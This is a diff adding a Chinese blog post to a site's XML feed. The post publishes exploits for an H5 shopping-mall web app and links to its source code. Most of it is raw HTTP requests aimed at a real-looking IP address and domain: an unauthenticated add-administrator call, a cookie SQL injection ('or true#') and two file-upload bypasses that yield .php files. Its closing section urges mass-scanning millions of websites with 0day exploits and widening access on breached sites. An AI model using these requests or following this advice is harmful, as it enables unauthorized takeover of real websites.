@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>某h5商城漏洞探究外加源码</title>
+      <link href="/penetrationtest/2025/04/articles/aaca2e7fa3565312/"/>
+      <url>/penetrationtest/2025/04/articles/aaca2e7fa3565312/</url>
+      
+        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>翻笔记翻到了去年7月份搞的站点,这个漏洞忘了从哪里看到的了我稍微加工了加工。现在公布出来。这个漏洞简单方便学习代码审计。闲话不多说直接放exp。由于是去年的漏洞现在网站已经关闭图片没有马赛克直接一镜到底。低调使用。请勿使用漏洞非法攻击网站。发布源代码仅提供学习研究。不要使用公开的exp攻击互联网网站。</p><h2 id="添加管理员"><a href="#添加管理员" class="headerlink" title="添加管理员"></a>添加管理员</h2><pre class="language-sh" data-language="sh"><code class="language-sh">POST &#x2F;admin&#x2F;api.php HTTP&#x2F;1.1Host: 1.117.76.188:88Content-Length: 135Accept: application&#x2F;json, text&#x2F;javascript, *&#x2F;*; q&#x3D;0.01X-Requested-With: XMLHttpRequestUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;122.0.6261.95 Safari&#x2F;537.36Content-Type: application&#x2F;x-www-form-urlencoded; charset&#x3D;UTF-8Origin: http:&#x2F;&#x2F;1.117.76.188:88Referer: http:&#x2F;&#x2F;1.117.76.188:88&#x2F;admin&#x2F;wz_sz&#x2F;adminSet.phpAccept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q&#x3D;0.9Connection: keep-aliveadmin&#x3D;true&amp;name&#x3D;%E8%B4%BA%E5%AE%87%E5%B9%B2%E9%B2%9C&amp;username&#x3D;admin123&amp;password&#x3D;admin123456&amp;pwd&#x3D;admin123456&amp;qq&#x3D;31393231&amp;wx&#x3D;152485399612</code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202504011518752.png" alt="测试截图"></p><h2 id="后台cookie注入"><a href="#后台cookie注入" class="headerlink" title="后台cookie注入"></a>后台cookie注入</h2><pre class="language-shell" data-language="shell"><code class="language-shell">GET &#x2F;admin&#x2F;index.php?id&#x3D;user HTTP&#x2F;1.1Host: 1.117.76.188:88Upgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;122.0.6261.95 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q&#x3D;0.9Cookie: username&#x3D;admin&#39;+or+true#Connection: keep-aliveReferer: http:&#x2F;&#x2F;1.117.76.188:88&#x2F;admin&#x2F;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202504011521502.png" alt="测试截图"></p><h2 id="文件上传一"><a href="#文件上传一" class="headerlink" title="文件上传一"></a>文件上传一</h2><pre class="language-sh" data-language="sh"><code class="language-sh">POST &#x2F;admin&#x2F;commodtiy&#x2F;file.php?upload&#x3D;1 HTTP&#x2F;1.1Host: 1.117.76.188:88Content-Length: 405Accept: application&#x2F;json, text&#x2F;javascript, *&#x2F;*; q&#x3D;0.01X-Requested-With: XMLHttpRequestUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;122.0.6261.95 Safari&#x2F;537.36Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryHA1b60Dgi0g9WBtfOrigin: http:&#x2F;&#x2F;1.117.76.188:88Referer: http:&#x2F;&#x2F;1.117.76.188:88&#x2F;user&#x2F;Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q&#x3D;0.9Connection: keep-alive------WebKitFormBoundaryHA1b60Dgi0g9WBtfContent-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;test.png&quot;Content-Type: image&#x2F;pngdfffs------WebKitFormBoundaryHA1b60Dgi0g9WBtf--</code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202504011525605.png" alt="测试截图"><br>上传成功返回 “/admin/commodtiy/upload/xxxxxxx.php”</p><h2 id="文件上传二"><a href="#文件上传二" class="headerlink" title="文件上传二"></a>文件上传二</h2><pre class="language-none"><code class="language-none">POST &#x2F;admin&#x2F;file.php HTTP&#x2F;2Host: qiminggay.icuCookie: yzm&#x3D;FFB8Content-Length: 426Sec-Ch-Ua: &quot;Chromium&quot;;v&#x3D;&quot;122&quot;, &quot;Not(A:Brand&quot;;v&#x3D;&quot;24&quot;, &quot;Google Chrome&quot;;v&#x3D;&quot;122&quot;Sec-Ch-Ua-Platform: &quot;Windows&quot;Sec-Ch-Ua-Mobile: ?0User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;122.0.6261.95 Safari&#x2F;537.36Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryNDfqoHwYfPZ51LSAAccept: *&#x2F;*Origin: https:&#x2F;&#x2F;qiminggay.icuSec-Fetch-Site: same-originSec-Fetch-Mode: corsSec-Fetch-Dest: emptyReferer: https:&#x2F;&#x2F;qiminggay.icu&#x2F;admin&#x2F;commodtiy&#x2F;index.php?page&#x3D;1Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q&#x3D;0.9------WebKitFormBoundaryNDfqoHwYfPZ51LSAContent-Disposition: form-data; name&#x3D;&quot;wangeditor-uploaded-image&quot;; filename&#x3D;&quot;test.php&quot;Content-Type: image&#x2F;pngdfdsafsfsad------WebKitFormBoundaryNDfqoHwYfPZ51LSA--</code></pre><p>上传成功后返回<br>{<br>    “errno”:0,<br>    “data”:{<br>        “url”:”&#x2F;upload&#x2F;xxxxx.php”,<br>        “alt”:” “,<br>        “href”:” “<br>    }<br>}</p><p>另外会提供这个h5商城的源代码。供代码审计学习。关于代码审计学习如何能独立审计代码。首先学习代码审计需要学习基础语言。这样可以审计简单的漏洞。后续在研究框架漏洞渗透测试。如果对框架审计有浓厚的兴趣可以后续。对框架漏洞进行研究不推荐因为耗时。并且需要深厚的功力。达到可以通过补丁diff出exp就行了。能达到这个水平也很牛逼了。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>最近AI比较火比如deepseek什么的有人说可以结合ai对代码进行审计。目前来说可能效果并不是好的但是后续看肯定是没问题的。有需要了解ai审计的可以在github中寻找代码审计的项目star以后看看。总的来说ai是辅助你干活并不能全部代替你去干活。后续等ai发展起来你自己的审计功底也有了那就是如虎添翼。结合批量工具可以编写自己的exp poc工具。搭载几百万甚至上千万网站进行漏洞扫描。结合0day和xday那你将在你的领域发光发热。不会编程的建议加紧学习。靠ai不行你让ai给你写个搭在几百万上千万的exp poc框架不可能。它只能给你优化。这个东西就像地基一样打好地基你的房子才能盖的结实。所以不要靠它给你打地基。如果有现成的源代码你可以直接进行修改站在巨人的肩膀上面。在github上面物色比较靠谱的项目。经过ai的打磨。然后自己审计0day和集成xday那将在一个领域无敌。拿到的站点进行代码审计扩大战果。这个h5是通过渗透测试方式拿到代码。有些漏洞是通过代码审计方式审计出来的。后续集成到你自己的工具上面那会很强大。所以重视起来代码审计。<br>代码下载链接:<br><a href="https://t.me/SoftwareNoticeChannel/856">https://t.me/SoftwareNoticeChannel/856</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> PenetrationTest </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CodeAuditExample </tag>
+            
+            <tag> PenetrationTest </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>使用软件源代码编写phpmyadmin爆破模块以及实战5W网站测试</title>
       <link href="/securitytools/2025/03/articles/1c4bc90eceabb786/"/>
       <url>/securitytools/2025/03/articles/1c4bc90eceabb786/</url>
